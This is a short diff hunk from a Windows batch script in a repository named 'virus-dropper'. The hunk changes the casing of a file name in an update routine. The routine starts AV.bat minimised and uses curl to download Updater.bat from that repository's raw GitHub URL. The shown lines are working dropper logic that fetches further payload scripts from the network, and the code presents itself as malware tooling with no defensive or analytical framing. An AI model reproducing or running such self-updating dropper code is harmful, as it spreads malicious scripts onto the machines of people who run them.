@@ -6,5 +6,5 @@ If %output% == %version% "exit" ELSE "goto update"
 
 :update
 start /min AV.bat
-curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/updater/Updater.bat" --output "Updater.bat"
+curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/updater/updater.bat" --output "Updater.bat"
 exit
